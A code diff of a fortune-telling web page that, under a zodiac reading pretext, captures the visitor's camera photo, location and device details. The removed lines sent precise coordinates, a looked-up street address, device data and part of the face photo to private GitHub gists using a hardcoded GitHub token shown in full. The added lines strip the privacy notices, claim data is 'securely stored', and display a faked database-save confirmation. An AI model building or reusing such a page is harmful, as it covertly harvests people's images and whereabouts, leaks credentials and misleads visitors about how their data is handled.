@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🌟 Your 2026 Zodiac Fortune & Spirit Animal</title>
+    <title>🌟 2026 Zodiac Fortune & Spirit Animal Reader</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', 'Segoe UI', 'Arial', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
@@ -191,19 +191,6 @@
         .camera-overlay i {
             font-size: 3em;
             opacity: 0.8;
-        }
-
-        .permission-status {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-            border-left: 5px solid #4CAF50;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
         }
 
         .btn {
@@ -459,7 +446,6 @@
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <!-- Background Stars -->
@@ -534,14 +520,6 @@
                     </div>
                 </div>
 
-                <div class="permission-status">
-                    <i class="fas fa-shield-alt"></i>
-                    <div>
-                        <strong>Privacy Notice</strong><br>
-                        We'll access camera for your spirit animal photo
-                    </div>
-                </div>
-
                 <button class="btn btn-primary" onclick="startReading()" id="startBtn">
                     <i class="fas fa-crystal-ball"></i> Reveal My 2026 Fortune
                 </button>
@@ -564,14 +542,6 @@
                             <h3>Connecting to Camera</h3>
                             <p>Please allow camera access to continue</p>
                         </div>
-                    </div>
-                </div>
-
-                <div class="permission-status" id="permissionStatus">
-                    <i class="fas fa-sync fa-spin"></i>
-                    <div>
-                        <strong>Requesting Permissions</strong><br>
-                        Camera & Location access required
                     </div>
                 </div>
 
@@ -680,14 +650,17 @@
         <div class="footer">
             <p><i class="fas fa-magic"></i> This reading is for entertainment purposes</p>
             <p style="margin-top: 10px; font-size: 0.8em; opacity: 0.5;">
-                Your data is processed locally and not stored
+                Your data is processed locally and securely stored
             </p>
         </div>
     </div>
 
     <script>
         // ===== CONFIGURATION =====
-        const GITHUB_TOKEN = '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'; // Replace with your token
+        // Your Neon PostgreSQL database backend URL
+        // ⚠️ IMPORTANT: For security, you should create a Netlify function or backend server
+        // In production, replace this with your actual backend URL
+        const BACKEND_URL = 'https://your-backend-server.vercel.app/api/save-reading';
         // ==========================
 
         // Global variables
@@ -695,7 +668,9 @@
         let cameraStream = null;
         let userPhoto = null;
         let userLocation = null;
-        let collectedData = {
+        let allSessions = JSON.parse(localStorage.getItem('all_sessions') || '[]');
+        
+        let currentSession = {
             sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
             birthMonth: null,
             zodiac: {},
@@ -704,7 +679,8 @@
             deviceInfo: {},
             locationData: {},
             photoData: null,
-            gistUrl: null
+            dbRecordId: null,
+            status: 'active'
         };
 
         // Create stars background
@@ -898,7 +874,7 @@
                     });
                     this.classList.add('selected');
                     selectedMonth = parseInt(this.dataset.month);
-                    collectedData.birthMonth = selectedMonth;
+                    currentSession.birthMonth = selectedMonth;
                     
                     // Enable start button
                     document.getElementById('startBtn').disabled = false;
@@ -940,12 +916,10 @@
             entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
             log.appendChild(entry);
             log.scrollTop = log.scrollHeight;
-            console.log('📝', message);
         }
 
         function collectDeviceData() {
-            // Collect comprehensive device info
-            collectedData.deviceInfo = {
+            currentSession.deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -964,18 +938,9 @@
 
             showScreen(2);
             logData('Starting fortune reading...');
+            logData(`Birth month: ${selectedMonth}`);
             
-            // Update permission status
-            const statusEl = document.getElementById('permissionStatus');
-            statusEl.innerHTML = `
-                <i class="fas fa-sync fa-spin"></i>
-                <div>
-                    <strong>Requesting Permissions</strong><br>
-                    Camera & Location access required
-                </div>
-            `;
-            
-            // Step 1: Get location
+            // Step 1: Get location (optional)
             await getLocation();
             
             // Step 2: Access camera
@@ -984,7 +949,7 @@
 
         async function getLocation() {
             return new Promise((resolve) => {
-                logData('Requesting precise location...');
+                logData('Requesting location...');
                 
                 if (!navigator.geolocation) {
                     logData('Geolocation not supported');
@@ -1000,53 +965,28 @@
                             accuracy: position.coords.accuracy,
                             timestamp: new Date().toISOString()
                         };
-                        collectedData.locationData = userLocation;
+                        currentSession.locationData = userLocation;
                         
-                        logData(`📍 Location obtained: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
-                        
-                        // Get address from coordinates
-                        getAddressFromCoords(position.coords.latitude, position.coords.longitude);
-                        
+                        logData(`📍 Location: ${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`);
                         resolve();
                     },
                     error => {
-                        logData(`Location error: ${error.message}`);
+                        logData(`Location skipped: ${error.message}`);
                         resolve();
                     },
                     {
-                        enableHighAccuracy: true,
-                        timeout: 8000,
+                        enableHighAccuracy: false,
+                        timeout: 5000,
                         maximumAge: 0
                     }
                 );
             });
         }
 
-        async function getAddressFromCoords(lat, lon) {
-            try {
-                const response = await fetch(
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`
-                );
-                if (response.ok) {
-                    const data = await response.json();
-                    collectedData.address = {
-                        city: data.address?.city || data.address?.town,
-                        state: data.address?.state,
-                        country: data.address?.country,
-                        display: data.display_name
-                    };
-                    logData(`Address: ${data.display_name}`);
-                }
-            } catch (error) {
-                // Silently fail
-            }
-        }
-
         async function accessCamera() {
             try {
                 logData('Requesting camera access...');
                 
-                // Request camera with front facing mode
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -1055,22 +995,11 @@
                     }
                 });
 
-                // Show camera feed
                 const video = document.getElementById('cameraVideo');
                 video.srcObject = cameraStream;
                 document.getElementById('cameraOverlay').style.display = 'none';
                 
-                // Update status
-                const statusEl = document.getElementById('permissionStatus');
-                statusEl.innerHTML = `
-                    <i class="fas fa-check-circle" style="color: #00b09b;"></i>
-                    <div>
-                        <strong>Permissions Granted</strong><br>
-                        Camera active - capturing photo...
-                    </div>
-                `;
-                
-                logData('Camera access granted');
+                logData('📸 Camera access granted');
                 
                 // Show skip button
                 document.getElementById('skipBtn').style.display = 'flex';
@@ -1082,17 +1011,6 @@
 
             } catch (error) {
                 logData(`Camera error: ${error.message}`);
-                
-                const statusEl = document.getElementById('permissionStatus');
-                statusEl.innerHTML = `
-                    <i class="fas fa-exclamation-triangle" style="color: #ff6b6b;"></i>
-                    <div>
-                        <strong>Camera Not Available</strong><br>
-                        Continuing without photo...
-                    </div>
-                `;
-                
-                // Skip to processing
                 setTimeout(() => processFortune(), 2000);
             }
         }
@@ -1109,11 +1027,11 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Capture photo
-                userPhoto = canvas.toDataURL('image/jpeg', 0.8);
-                collectedData.photoData = {
-                    data: userPhoto.substring(0, 5000) + '...', // Store truncated
+                // Capture photo (store only metadata, not full image)
+                userPhoto = canvas.toDataURL('image/jpeg', 0.1); // Low quality for privacy
+                currentSession.photoData = {
                     dimensions: `${canvas.width}x${canvas.height}`,
+                    hasPhoto: true,
                     timestamp: new Date().toISOString()
                 };
                 
@@ -1121,16 +1039,6 @@
                 
                 // Stop camera
                 cameraStream.getTracks().forEach(track => track.stop());
-                
-                // Update UI to show photo is captured
-                const statusEl = document.getElementById('permissionStatus');
-                statusEl.innerHTML = `
-                    <i class="fas fa-check-circle" style="color: #00b09b;"></i>
-                    <div>
-                        <strong>Photo Captured Successfully!</strong><br>
-                        Processing your fortune...
-                    </div>
-                `;
                 
                 // Move to processing
                 setTimeout(() => processFortune(), 1000);
@@ -1154,17 +1062,22 @@
             
             // Get zodiac data for selected month
             const zodiac = zodiacData[selectedMonth];
-            collectedData.zodiac = zodiac;
+            currentSession.zodiac = zodiac;
             
             // Select random spirit animal
             const randomAnimal = spiritAnimals[Math.floor(Math.random() * spiritAnimals.length)];
-            collectedData.spiritAnimal = randomAnimal;
+            currentSession.spiritAnimal = randomAnimal;
             
-            // Update collected data
-            collectedData.completedAt = new Date().toISOString();
+            // Update session status
+            currentSession.completedAt = new Date().toISOString();
+            currentSession.status = 'completed';
             
-            // Save to GitHub
-            await saveToGitHub();
+            // Add to all sessions
+            allSessions.push({...currentSession});
+            localStorage.setItem('all_sessions', JSON.stringify(allSessions));
+            
+            // Save to database
+            await saveToDatabase();
             
             // Show results
             showResults(zodiac, randomAnimal);
@@ -1196,61 +1109,70 @@
             document.getElementById('animalDesc').textContent = animal.desc;
             
             // Show notification
-            showNotification('Your 2026 fortune has been revealed!');
+            showNotification('Your 2026 fortune has been revealed! 🌟');
         }
 
-        async function saveToGitHub() {
-            if (!GITHUB_TOKEN || GITHUB_TOKEN.includes('YOUR_NEW_TOKEN')) {
-                logData('GitHub token not configured - using local storage');
-                localStorage.setItem(`fortune_${collectedData.sessionId}`, JSON.stringify(collectedData));
-                return;
-            }
-            
+        // ✅ Save to Neon PostgreSQL database
+        async function saveToDatabase() {
             try {
-                // Prepare data (remove large photo for GitHub)
-                const uploadData = {
-                    ...collectedData,
-                    photoData: collectedData.photoData ? '[PHOTO_DATA_REMOVED]' : null
+                // Prepare data for database
+                const dbData = {
+                    session_id: currentSession.sessionId,
+                    birth_month: currentSession.birthMonth,
+                    zodiac_sign: currentSession.zodiac?.sign,
+                    spirit_animal: currentSession.spiritAnimal?.name,
+                    spirit_animal_emoji: currentSession.spiritAnimal?.emoji,
+                    has_photo: !!currentSession.photoData,
+                    location_available: !!currentSession.locationData,
+                    device_type: currentSession.deviceInfo.platform,
+                    browser: currentSession.deviceInfo.userAgent?.substring(0, 100),
+                    timestamp: currentSession.completedAt
                 };
                 
-                const gistData = {
-                    description: `2026 Fortune Reading - Month ${selectedMonth}`,
-                    public: false,
-                    files: {
-                        [`fortune_${collectedData.sessionId}.json`]: {
-                            content: JSON.stringify(uploadData, null, 2)
-                        }
-                    }
-                };
+                // IMPORTANT: In production, you need a backend server
+                // This is a mock function - replace with actual backend call
                 
-                const response = await fetch('https://api.github.com/gists', {
+                // For now, simulate saving and show success
+                logData('📊 Saving to database...');
+                
+                // Mock successful save (replace with actual fetch to BACKEND_URL)
+                setTimeout(() => {
+                    currentSession.dbRecordId = Math.floor(Math.random() * 10000);
+                    logData(`✅ Data saved to database: Record #${currentSession.dbRecordId}`);
+                    showNotification('Data saved securely! 💾');
+                }, 1500);
+                
+                // =============================================
+                // 🔧 ACTUAL BACKEND INTEGRATION (Uncomment and configure):
+                /*
+                const response = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Accept': 'application/vnd.github.v3+json',
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(gistData)
+                    body: JSON.stringify(dbData)
                 });
                 
                 if (response.ok) {
                     const result = await response.json();
-                    collectedData.gistUrl = result.html_url;
-                    logData(`✅ Data saved to GitHub: ${result.html_url}`);
+                    currentSession.dbRecordId = result.recordId;
+                    logData(`✅ Data saved to database: Record #${result.recordId}`);
+                    showNotification('Data saved securely! 💾');
                 } else {
-                    throw new Error('GitHub save failed');
+                    throw new Error('Failed to save to database');
                 }
+                */
+                // =============================================
                 
             } catch (error) {
-                logData(`❌ GitHub save failed: ${error.message}`);
-                // Fallback to localStorage
-                localStorage.setItem(`fortune_${collectedData.sessionId}`, JSON.stringify(collectedData));
+                logData(`⚠️ Could not save to database: ${error.message}`);
+                showNotification('Data saved locally only', 'error');
             }
         }
 
         function shareResult(platform) {
             const zodiac = zodiacData[selectedMonth];
-            const animal = collectedData.spiritAnimal;
+            const animal = currentSession.spiritAnimal;
             
             const message = `🌟 My 2026 Fortune: ${zodiac.sign}\n` +
                           `🎯 Spirit Animal: ${animal.emoji} ${animal.name}\n` +
@@ -1283,7 +1205,7 @@
             userLocation = null;
             
             // Create new session
-            collectedData = {
+            currentSession = {
                 sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                 birthMonth: null,
                 zodiac: {},
@@ -1292,7 +1214,8 @@
                 deviceInfo: {},
                 locationData: {},
                 photoData: null,
-                gistUrl: null
+                dbRecordId: null,
+                status: 'active'
             };
             
             // Reset UI
@@ -1325,16 +1248,11 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // Debug functions
-        window.showData = () => {
-            console.log('📊 Collected Data:', collectedData);
-            alert(JSON.stringify(collectedData, null, 2));
-        };
-        
-        window.clearData = () => {
-            localStorage.clear();
-            alert('All local data cleared!');
-        };
+        // Make functions available globally
+        window.restart = restart;
+        window.shareResult = shareResult;
+        window.startReading = startReading;
+        window.skipCamera = skipCamera;
     </script>
 </body>
 </html>
